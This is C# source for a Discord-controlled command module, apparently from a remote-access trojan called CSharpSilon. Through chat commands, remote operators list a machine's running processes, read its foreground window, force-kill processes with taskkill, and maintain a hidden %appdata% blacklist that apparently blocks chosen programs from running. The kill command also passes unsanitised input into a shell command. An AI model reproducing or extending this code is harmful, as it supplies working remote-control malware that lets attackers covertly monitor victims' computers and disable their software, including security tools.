using System;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace CSharpSilon.cmds
{
    public class Processes : ModuleBase<SocketCommandContext>
    {

        [Command("show"), Summary("Shows All Current Running Processes")]
        public async Task Show()
        {
            var processesList = Process.GetProcesses().Select(p => p.ProcessName).ToList();
            processesList.Sort();
            var processGroups = processesList.GroupBy(p => p).Select(g => $"{g.Key} [x{g.Count()}]").ToList();
            var totalProcesses = processesList.Count;
            
            var processes = string.Join("\n", processGroups.Select((proc, index) => $"**{index + 1})** {proc}"));
            string msg = $"Processes at {DateTime.Now}\n```{processes}\nTotal processes: {totalProcesses}```\n```If you want to kill a process, type {Config.Prefix}kill <process-name>```";

            await ReplyAsync(msg);
        }
        
        
        
        [Command("foreground"), Summary("Gets The Current Foreground Window")]
        public async Task Foreground()
        {
            await Context.Message.DeleteAsync();

            var foregroundWindow = GetForegroundWindow();
            uint processId = 0;
            GetWindowThreadProcessId(foregroundWindow, out processId);
            var processName = Process.GetProcessById((int)processId)?.ProcessName;

            if (processName == null)
            {
                await ReplyAsync("```Failed to get foreground window process name.```");
            }
            else
            {
                var msg = $"```{processName}```\n```You can kill it with -> {Config.Prefix}kill {processName}```";
                ReplyAsync(msg);
                
            }
        }

        [Command("kill"), Summary("Kill A Proccess Based Off Of It's Proccess Name")]
        public async Task Kill([Remainder] string processName)
        {
            var procs = Process.GetProcessesByName(processName);
            if (procs.Length >= 1)
            {
                if (!processName.EndsWith(".exe")) processName += ".exe";
                Utils.App.execute($"taskkill /f /im {processName}");
                await Task.Delay(500);

                if (!Process.GetProcessesByName(processName).Any())
                {
                    
                    await ReplyAsync($"```Successfully killed {processName}```");
                }
                else
                {
                    
                    await ReplyAsync($"```Tried to kill {processName} but it's still running...```");
                }
            }
            else
            {
                
                await ReplyAsync($"```Could not find process by name: {processName}```");
            }


        }

        [Command("blacklist"), Summary("Blacklists A Process From Being Open")]
        public async Task Blacklist([Remainder] string processName)
        {
            var folderPath = $@"{Environment.GetEnvironmentVariable("%appdata%")}\cs";
            if (!Directory.Exists(folderPath)) Directory.CreateDirectory(folderPath);
            var filePath = $@"{folderPath}\disabledprocs.csln";
            if (!File.Exists(filePath)) File.Create(filePath).Dispose();

            var disabledProcessesList = File.ReadAllLines(filePath).ToList();
            if (!disabledProcessesList.Contains(processName))
            {
                disabledProcessesList.Add(processName);
                File.WriteAllLines(filePath, disabledProcessesList);
                await ReplyAsync($"```{processName} has been added to process blacklist```");
            }
            else
            {
                await ReplyAsync("```This process is already blacklisted, so there's nothing to disable```");
            }
        }

        [Command("whitelist"), Summary("Whitelists A Blacklisted Process")]
        public async Task Whitelist([Remainder] string processName)
        {
            var folderPath = $@"{Environment.GetEnvironmentVariable("%appdata%")}\cs";
            if (!Directory.Exists(folderPath)) Directory.CreateDirectory(folderPath);
            var filePath = $@"{folderPath}\disabledprocs.csln";
            if (!File.Exists(filePath)) File.Create(filePath).Dispose();

            var disabledProcessesList = File.ReadAllLines(filePath).ToList();
            if (disabledProcessesList.Contains(processName))
            {
                disabledProcessesList.Remove(processName);
                File.WriteAllLines(filePath, disabledProcessesList);

                await ReplyAsync($"```{processName} has been removed from process blacklist```");
            }
            else
            {
                await ReplyAsync("```This process is not blacklisted```");
            }
        }
        

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    }
}